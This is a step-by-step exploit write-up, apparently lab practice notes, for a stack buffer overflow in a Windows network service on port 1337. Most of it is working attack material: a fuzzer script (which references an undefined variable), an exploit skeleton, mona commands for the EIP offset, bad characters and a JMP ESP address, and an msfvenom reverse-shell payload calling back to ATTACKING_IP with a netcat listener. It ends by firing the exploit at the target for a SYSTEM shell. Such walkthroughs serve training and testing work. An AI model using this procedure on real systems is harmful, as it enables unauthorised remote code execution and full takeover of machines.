I was able to exploit a stack based buffer overflow that I found on the service  running on the machine IP X.X.X.X.
In the following section, I document my approach by writing the same commands and procedures that I did.
In this way, a technician will be able to take these instructions, follow them, and exploit this vulnerability.
# 0. Set Up
1. Start ImmunityDebugger by double clicking on it;
2. Configure mona with
`!mona config -set workingfolder c:\desired\path\%p`
2. Open from ImmunityDebugger the vulnerable application exe with the shortcut `F3`;
3. Run the vulnerable application exe with the shortcut `F9`;
4. Along the documentation, when it's written "reopen the app from ImmunityDebugger" or something similar, it means that the app needs to be reopened and relaunched;
5. With the term `debugging machine` I intend the machine used to debug and test the exploit;
6. With the term `target`, I intend the actual target machine that need to be exploited;
7. Note that sometimes mona won't automatically open the correct window. If this happens while you're following my guide, please use of the Window option from ImmunityDebugger menu bar to choose the correct window
![[Pasted image 20210827231124.png]]
# 1. fuzzing
With a script, fuzz the service by sending 100 bytes per time.  
Note with how many bytes the service has crashed.
To fuzz it I've used the following
```python
#!/usr/bin/python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5

string = "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
	
  string += 100 * "A"
  
  time.sleep(1)
```

The app has crashed with:

Notice that the debugger alerted for an access violation:

# 2. Replicating the crash and controlling EIP
Before moving on, I had to discover if I was able to control the EIP. This is essential as by controlling it I would be able to change the program's flow.
As the fuzzer indicated that the app has crashed with `xxx` bytes, I've add `400` more bytes to it, for a total of `xx` bytes.

Then, with this number of bytes, I've generated a pattern with the msf script:
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400`
The generated pattern was the following:

Then to use this patter, I've made use of another python script that I've called `exploit.py`. Its content:
```python
#!/usr/bin/python3

import socket

ip = "MACHINE IP"
port = 1337

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

1. Inside this code, put the generated pattern in the `payload` variable.

2. Then, open again the application within ImmunityDebugger and run the exploit.

3. Switch to the debugging machine, launch from ImmunityDebugger command bar this mona command to look for the EIP offset:
`!mona findmsp -distance xxx+400`
> By running it, the log window should show up, if not, you can pick it from the Window tab in the menu bar

4. Check for the following string: `EIP contains normal pattern OFFSET XXXX`
Make note of it
1. Update in the exploit.py source code the `retn` variable to the value `WWWW` so it will be easier to recognize it in the registry
2. Update in the exploit.py source code the `payload` variable to an empy value.
8. The source code should be like this:
9. Re-open the application, then relaunch the exploit.
10. Switch to the debugging machine, and from ImmunityDebugger check if the EIP value is `57575757`, if so it means that the EIP is controllable.

# 3. Bad Chars
Bad characters are characters that once read by the CPU, the latter will stop the execution or cause unexpected errors. So we need to know them in order to avoid them in the RETN address and in our shell code.

1. From ImmmunityDebugger, with mona, generate the byte array that it'll be used later by issuing:
`!mona byterarray -b "\x00"`
I've already removed the x00 as it is a bad character by default.
Take note of the bytearray.bin path.

2. Then generate a payload of bad chars. To do so, I've used the following python script named genesis.py
```python
#!/usr/bin/python3

print("[!] Generating a complete list of bad chars.\n\n")

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
  
print("\n\n[!] Completed.")
```
This generated the following string:
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

3. If the app is in a crashed state, reopen it
4. Set the `payload` variable to the generated bad chars string
5. Then relaunch the program and switch to the debugging machine.
6. From ImmunityDebugger, make note of the ESP address, then compare the bad chars in the exploit with the ones in the memory by issuing the following mona command, and give to it the noted ESP address:
`!mona compare -f c:\path\to\bytearray.bin -a ESP_address`
This command should have opened the "_Memory comparison results_" window (If not, open it with the Window menu from the menu bar on the top).
What it shows is the output of the comparison between the characters in memory and the ones in our bytearray.bin.  
In other words, this is a list of potentially bad characters.
> Bear in mind that when a bad chars is found, mona will set the consequence chars as bad too. It may be that by removing only the first bad char in the series, the others will not be labeled as bad chars anymore.

The bad chars found are ``
From this list, I decided to remove only `` as they are the first of their series
5. Remove the bad chars from the payload (I helped myself with the find and replace function of atom)  
Copy the payload and save to a file named badchars, inside that file look for each bad char, and remove all of them. Then recopy the new badchars list to the payload.
6. Create a new bytearray by providing the new bad chars too
7. Reopen the app in ImmunityDebugger
8. Relaunch the exploit
9. Repeat the process until the mona output is "Unmodified"

So, it confirms that the badchars are
# 4. Find a valid RETN address
With the knowledge of the bad chars, the next step is finding a valid return address.
> For this task, the exe could be either running or in a crashed state.

The steps are:
1. From ImmunityDebugger, launch the mona command by providing all the bad chars found:
`!mona jmp -r esp -cpb "<whole bad chars list>"`
The following is a list of compliant addresses, choose one of them

2. Note that as the system is 32 bit, its endianness is little, so to make use of the chosen address, you need to revert it as follow:
`00012e3c ---> 3c2e0100`
3. Add the backslash and x to each part of the address, then put it inside the retn variable in the exploit code.

# 5. Generating the shellcode
A stack BOF vulnerability works at a low level, so putting high level code inside the payload won't work. This is the reason a shellcode is needed.

Steps to follow:
1. To generate one, use msfvenom capabilities with the following command, and give to it all the bad chars too:
`msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LISTENING_PORT EXITFUNC=thread -b "\x00" -f c`
Instead of ATTACKING_IP and LISTENING_PORT put respectively the IP where you want to get a connection back, and the port where you set up the listener.
> `EXITFUNC`, if not provided, the shellcode will cause the crash of the program. We don't want that as we need it to run. So we define a way to handle it by telling it to exit on thread.
2. Put the generated shell code inside the payload as follow
3. Insert **at least** 16 `NOP` codes "\x90" in the `padding` variable. They'll let the shellcode to have enough space to unpack itself.
4. Start the listener with rlwrap (optional) and netcat using the following command
`rlwrap nc -lvnp LISTENING_PORT`
5. With the application running in the ImmunityDebugger, launch the exploit
6. After a few seconds, a connection should hit the listener and prompt an interactive shell from the debugging machine with `NT AUTHORITY\SYSTEM` privileges.

At this point, close the listener and reopen it, then launch the same exploit code against the target.